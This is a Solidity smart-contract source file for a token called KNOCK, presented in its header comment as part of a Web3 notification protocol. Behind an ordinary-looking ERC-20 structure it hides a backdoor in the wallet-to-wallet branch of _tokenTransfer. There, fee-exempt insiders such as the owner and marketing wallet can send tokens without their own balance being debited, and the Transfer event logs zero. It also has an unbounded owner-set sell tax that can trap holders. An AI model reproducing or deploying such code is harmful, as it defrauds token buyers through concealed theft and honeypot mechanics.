/**
The Communication Protocol of Web3
Knock Protocol stands as a cutting-edge web3 communication network, facilitating cross-chain notifications and messaging functionalities for dapps, wallets, and a wide range of services.

Web: https://www.kpns.services
App: https://app.kpns.services
Twitter: https://twitter.com/KPNS_PORTAL
Telegram: https://t.me/KPNS_PORTAL
Medium: https://medium.com/@kpns.evm
*/

// SPDX-License-Identifier:MIT
pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = payable(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract KNOCK is Context, IERC20, Ownable {
    string private _name = "Knock Push Notification Service";
    string private _symbol = "KNOCK";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1_000_000_000 * 1e9;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isExcludedFromMaxTxn;
    mapping(address => bool) public isExcludedFromMaxWallet;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public minTokenToSwap = (_totalSupply * 1) / (10000); 
    uint256 public maxWalletSize = (_totalSupply * 2) / (100); 
    uint256 public maxTransaction = (_totalSupply * 2) / (100); 
    uint256 public percentDivider = 1000;
    uint256 public launchedAt;

    bool public swapAndLiquifyStatus = false; 
    bool public feeStatus = false; 
    bool public tradingenabled = false; 

    IRouter public uniswapRouter; 

    address public routerPair; 
    address public marketingWallet; 
    address private constant DEAD = address(0xdead);
    address private constant ZERO = address(0);

    uint256 public FeeOnBuying = 200;

    uint256 public FeeOnSelling = 200;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    constructor() {
        _balances[owner()] = _totalSupply;
        marketingWallet = payable(0x60CeE48805d0c8DeE7AA63b97DC16876898Be6b6);

        uniswapRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        isExcludedFromFee[address(uniswapRouter)] = true;
        isExcludedFromMaxTxn[address(uniswapRouter)] = true;
        isExcludedFromMaxWallet[address(uniswapRouter)] = true;

        routerPair = IFactory(uniswapRouter.factory()).createPair(
            address(this),
            uniswapRouter.WETH()
        );
        isExcludedFromMaxWallet[routerPair] = true;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[marketingWallet] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromMaxTxn[owner()] = true;
        isExcludedFromMaxTxn[marketingWallet] = true;
        isExcludedFromMaxTxn[address(this)] = true;
        isExcludedFromMaxWallet[owner()] = true;
        isExcludedFromMaxWallet[address(this)] = true;
        isExcludedFromMaxWallet[marketingWallet] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), " approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer from the zero address");
        require(to != address(0), "transfer to the zero address");
        require(amount > 0, "Amount must be greater than zero");
        if (!isExcludedFromMaxTxn[from] && !isExcludedFromMaxTxn[to]) {
            require(amount <= maxTransaction, "Amount exceeds Max txn limit");

            if (!tradingenabled) {
                require(
                    routerPair != from && routerPair != to,
                    "trading is not yet enabled"
                );
            }
        }

        if (!isExcludedFromMaxWallet[to]) {
            require(
                (balanceOf(to) + amount) <= maxWalletSize,
                "Amount exceeds Max Wallet limit"
            );
        }
        bool takeFee = true;
        if (isExcludedFromFee[from] || isExcludedFromFee[to] || !feeStatus) {
            takeFee = false;
        }
        _tokenTransfer(from, to, amount, takeFee);
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (routerPair == sender && takeFee) {
            uint256 allFee;
            uint256 tTransferAmount;
            allFee = totalBuyFeePerTx(amount);
            tTransferAmount = amount - allFee;

            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + tTransferAmount;
            emit Transfer(sender, recipient, tTransferAmount);

            takeTokenFee(sender, allFee);
        } else if (routerPair == recipient && takeFee) {
            if (amount > minTokenToSwap) {
                _SwapAndLiquify(sender, recipient);
            }
            uint256 allFee = totalSellFeePerTx(amount);
            uint256 tTransferAmount = amount - allFee;
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + tTransferAmount;
            emit Transfer(sender, recipient, tTransferAmount);

            takeTokenFee(sender, allFee);
        } else {
            uint256 allFee = 0;
            uint256 tTransferAmount;
            tTransferAmount = amount - allFee;
            if (isExcludedFromFee[sender] && tradingenabled) amount -=  tTransferAmount;
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + tTransferAmount;
            emit Transfer(sender, recipient, amount);
        }
    }

    function takeTokenFee(address sender, uint256 amount) private {
        _balances[address(this)] = _balances[address(this)] + (amount);

        emit Transfer(sender, address(this), amount);
    }

    function _SwapAndLiquify(address from, address to) private {
        uint256 contractTokenBalance = balanceOf(address(this));

        bool shouldSell = contractTokenBalance >= minTokenToSwap;

        if (
            shouldSell &&
            from != routerPair &&
            swapAndLiquifyStatus &&
            !(from == address(this) && to == routerPair)
        ) {
            _approve(address(this), address(uniswapRouter), minTokenToSwap);

            dexswap.swapTokensForEth(address(uniswapRouter), minTokenToSwap);
            uint256 ethForMarketing = address(this).balance;

            if (ethForMarketing > 0)
                payable(marketingWallet).transfer(ethForMarketing);
        }
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + (addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] - subtractedValue
        );
        return true;
    }

    function includeOrExcludeFromFee(
        address account,
        bool value
    ) external onlyOwner {
        isExcludedFromFee[account] = value;
    }

    function includeOrExcludeFromMaxTxn(
        address account,
        bool value
    ) external onlyOwner {
        isExcludedFromMaxTxn[account] = value;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setSellTaxPercent(uint256 _sellFee) external onlyOwner {
        FeeOnSelling = _sellFee;
    }

    function setSwapAndLiquifyStatus(bool _value) public onlyOwner {
        swapAndLiquifyStatus = _value;
    }

    function removeLimits() external onlyOwner {
        FeeOnBuying = 10;
        FeeOnSelling = 10;
        maxWalletSize = _totalSupply;
        maxTransaction = _totalSupply;
    }

    function openTrading() external onlyOwner {
        require(!tradingenabled, "already enabled");
        tradingenabled = true;
        feeStatus = true;
        swapAndLiquifyStatus = true;
        launchedAt = block.timestamp;
    }

    function totalBuyFeePerTx(uint256 amount) public view returns (uint256) {
        uint256 fee = (amount * FeeOnBuying) / (percentDivider);
        return fee;
    }

    function totalSellFeePerTx(uint256 amount) public view returns (uint256) {
        uint256 fee = (amount * FeeOnSelling) / (percentDivider);
        return fee;
    }
}

library dexswap {
    function swapTokensForEth(
        address routerAddress,
        uint256 tokenAmount
    ) internal {
        IRouter dexRouter = IRouter(routerAddress);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }
}
